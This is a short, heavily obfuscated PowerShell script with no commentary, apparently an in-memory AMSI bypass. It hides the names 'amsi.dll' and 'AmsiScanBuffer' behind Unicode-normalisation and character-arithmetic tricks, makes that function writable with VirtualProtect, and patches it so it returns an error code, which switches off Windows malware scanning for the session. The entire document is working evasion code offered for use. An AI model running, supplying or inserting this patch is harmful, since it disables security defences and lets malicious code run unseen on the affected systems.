$SSW_0uUorvy = @"
using System;
using System.Runtime.InteropServices;
public class SSW_0uUorvy {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BuU4Z1iD, string qN4NYD);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr l9o, UIntPtr XXa, uint zS1sgxBIF, out uint Oi7pew);
}
"@

Add-Type $SSW_0uUorvy

$Tadno = [SSW_0uUorvy]::LoadLibrary("$(('âmsí'+'.dll').norMAlizE([ChaR]([ByTE]0x46)+[CHaR]([byTE]0x6f)+[chaR](114+14-14)+[Char](109)+[ChaR](68)) -replace [CHAr](92+16-16)+[ChAR]([BytE]0x70)+[chaR]([bYte]0x7b)+[chaR](77*17/17)+[cHaR]([bYtE]0x6e)+[cHaR]([BytE]0x7d))")
$_ovHMdbVPfbo = [SSW_0uUorvy]::GetProcAddress($Tadno, "$(('ÁmsìScãnB'+'ùffèr').noRmalIze([CHar]([BYtE]0x46)+[ChAr](111*98/98)+[ChAR](114*47/47)+[CHAR](109*35/35)+[Char](14+54)) -replace [chAR]([Byte]0x5c)+[chAr](112+9-9)+[CHar](123*1/1)+[cHAr]([byTe]0x4d)+[cHAr](88+22)+[chAR](125+18-18))")
$p = 0
[SSW_0uUorvy]::VirtualProtect($_ovHMdbVPfbo, [uint32]5, 0x40, [ref]$p)
$RlS3 = "0xB8"
$EgtRwilVxiFVju = "0x57"
$VrDIF7r3NP = "0x00"
$UWrO = "0x07"
$rTg = "0x80"
$YV5NS5fAMl75KXvsf = "0xC3"
$MxWgyr52E = [Byte[]] ($RlS3,$EgtRwilVxiFVju,$VrDIF7r3NP,$UWrO,+$rTg,+$YV5NS5fAMl75KXvsf)
[System.Runtime.InteropServices.Marshal]::Copy($MxWgyr52E, 0, $_ovHMdbVPfbo, 6)